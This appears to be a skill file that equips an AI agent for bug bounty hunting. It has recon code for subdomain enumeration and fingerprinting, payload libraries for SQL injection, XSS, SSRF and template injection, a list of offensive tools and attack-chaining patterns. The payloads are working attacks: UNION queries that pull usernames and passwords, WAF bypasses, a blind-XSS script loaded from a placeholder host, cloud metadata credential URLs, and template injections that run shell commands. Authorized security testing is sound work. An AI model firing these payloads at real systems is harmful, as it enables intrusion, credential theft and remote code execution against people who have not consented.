---
name: bug-bounty-hunter
description: Technical skill engine for bug bounty hunting.
---

# BUG BOUNTY HUNTER — TECHNICAL SKILL ENGINE

> SYNC 3/3: [AGENTS.md](./AGENTS.md) | [RULES.md](./RULES.md)

## 1. RECON AUTOMATION (Python 3.14+)

### Subdomain Enumeration
```python
import asyncio, httpx, re
from typing import Set
async def enumerate_subdomains(domain: str) -> Set[str]:
    subs = set()
    async with httpx.AsyncClient(timeout=30, follow_redirects=True) as c:
        # crt.sh Certificate Transparency
        try:
            r = await c.get(f"https://crt.sh/?q=%.{domain}&output=json")
            if r.status_code == 200:
                for e in r.json():
                    for s in e.get("name_value","").splitlines():
                        s = s.strip().lower()
                        if s.endswith(f".{domain}") or s == domain: subs.add(s)
        except Exception as e: print(f"[!] crt.sh: {e}")
        # HackerTarget
        try:
            r = await c.get(f"https://api.hackertarget.com/hostsearch/?q={domain}")
            if r.status_code == 200:
                for line in r.text.strip().splitlines():
                    if "," in line: subs.add(line.split(",")[0].strip().lower())
        except Exception as e: print(f"[!] HackerTarget: {e}")
        # AlienVault OTX
        try:
            r = await c.get(f"https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns")
            if r.status_code == 200:
                for e in r.json().get("passive_dns", []):
                    h = e.get("hostname","").lower()
                    if h.endswith(f".{domain}"): subs.add(h)
        except Exception as e: print(f"[!] OTX: {e}")
    return subs
```

### Tech Fingerprinting
```python
async def fingerprint_tech(url: str) -> dict:
    tech = {"server":[],"framework":[],"cms":[],"waf":[],"headers":{}}
    async with httpx.AsyncClient(timeout=15, verify=False, follow_redirects=True) as c:
        r = await c.get(url)
        h = dict(r.headers); tech["headers"] = h
        if "server" in h: tech["server"].append(h["server"])
        if "x-powered-by" in h: tech["framework"].append(h["x-powered-by"])
        waf_sigs = {"cloudflare":["cf-ray"],"akamai":["x-akamai-transformed"]}
        for waf, sigs in waf_sigs.items():
            if any(s in h for s in sigs): tech["waf"].append(waf)
        body = r.text
        cms_pats = {"WordPress":[r"wp-content/"],"Laravel":[r"laravel_session"],
                   "Next.js":[r"__NEXT_DATA__"],"React":[r"data-reactroot"]}
        for cms, pats in cms_pats.items():
            if any(re.search(p, body, re.I) for p in pats): tech["cms"].append(cms)
    return tech
```

## 2. PAYLOAD LIBRARIES

### SQLi Payloads
```
Detection: ' | " | ' OR '1'='1 | ' OR 1=1-- | 1' ORDER BY 1--+
Union: ' UNION SELECT NULL,NULL,NULL-- | ' UNION SELECT username,password FROM users--
Blind Bool: ' AND 1=1-- | ' AND 1=2--
Blind Time: ' AND SLEEP(5)-- | ' AND IF(1=1,SLEEP(5),0)-- | ' AND pg_sleep(5)--
WAF Bypass: ' /*!50000OR*/ 1=1-- | ' uNiOn sElEcT 1,2,3--
NoSQL: {"$gt":""} | {"$ne":""} | {"$regex":".*"}
```

### XSS Payloads
```
Basic: <script>alert(1)</script> | <img src=x onerror=alert(1)> | <svg onload=alert(1)>
Bypass: <ScRiPt>alert(1)</ScRiPt> | <svg/onload=alert(1)> | <details open ontoggle=alert(1)>
DOM: javascript:alert(1) | #<img src=x onerror=alert(1)>
Blind: "><script src=https://YOUR_BXSS/x.js></script>
```

### SSRF Payloads
```
Basic: http://127.0.0.1 | http://localhost | http://[::1]
Cloud AWS: http://169.254.169.254/latest/meta-data/
Cloud AWS Creds: http://169.254.169.254/latest/meta-data/iam/security-credentials/
Cloud GCP: http://metadata.google.internal/computeMetadata/v1/
Cloud Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
Bypass: http://127.1 | http://0 | http://0177.0.0.1/ | gopher://127.0.0.1:25/
```

### SSTI Payloads
```
Detect: {{7*7}} | ${7*7} | #{7*7} | <%= 7*7 %>
Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
Twig: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
ERB: <%= system('id') %>
```

## 3. SECURITY HEADERS
| Header | Severity | Risk |
|--------|----------|------|
| strict-transport-security | HIGH | SSL stripping |
| content-security-policy | MEDIUM | XSS risk |
| x-content-type-options | LOW | MIME sniffing |
| x-frame-options | MEDIUM | Clickjacking |
| referrer-policy | LOW | URL leakage |
| permissions-policy | LOW | Feature abuse |
| cross-origin-opener-policy | MEDIUM | Cross-origin attacks |

## 4. TOOL ARSENAL
| Tool | Purpose | Type |
|------|---------|------|
| Nmap | Port scan | System install |
| Burp Suite | Web proxy | System install |
| ffuf | Fuzzing | Portable Go |
| nuclei | Vuln scanner | Portable Go |
| httpx | HTTP probe | Portable Go |
| subfinder | Subdomains | Portable Go |
| sqlmap | SQLi | Python pip |
| dirsearch | Dir brute | Python pip |
| jwt_tool | JWT test | Python pip |
| dalfox | XSS scan | Portable Go |

Python libs: httpx[http2] aiohttp requests beautifulsoup4 pyjwt cryptography dnspython shodan rich tabulate

## 5. CHAINING PATTERNS
```
Open Redirect + OAuth = Account Takeover
SSRF + Cloud Metadata = Full Compromise
XSS + CSRF = Stored Worm
IDOR + Info Disclosure = Mass Data Exfil
SQLi + File Write = RCE
Subdomain Takeover + Cookie Scope = Session Hijack
Request Smuggling + Cache Poisoning = Mass XSS
SSTI + Sandbox Escape = RCE
JWT None Alg + Admin Claim = Priv Escalation
```

*SKILL engine loaded.*
